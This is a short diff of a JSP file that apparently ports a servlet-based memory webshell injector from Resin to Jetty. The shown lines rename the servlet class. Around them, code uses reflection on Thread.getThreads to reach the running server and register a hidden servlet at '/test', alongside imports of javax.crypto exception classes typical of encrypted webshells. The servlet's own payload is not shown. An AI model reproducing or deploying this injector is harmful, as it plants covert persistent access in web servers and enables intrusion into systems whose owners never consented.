@@ -10,7 +10,7 @@
 <%@ page import="javax.crypto.IllegalBlockSizeException" %>
 <%@ page import="javax.crypto.BadPaddingException" %>
 <%!
-class ResinServlet extends HttpServlet {
+class JettyServlet extends HttpServlet {
 
     @Override
     public void init() throws ServletException {
@@ -74,7 +74,7 @@ class ResinServlet extends HttpServlet {
 <%
     String servletName = "myServlet";
     String urlPattern = "/test";
-    Servlet servlet = new ResinServlet();
+    Servlet servlet = new JettyServlet();
     Method threadMethod = Class.forName("java.lang.Thread").getDeclaredMethod("getThreads");
     threadMethod.setAccessible(true);
     Thread[] threads = (Thread[]) threadMethod.invoke(null);
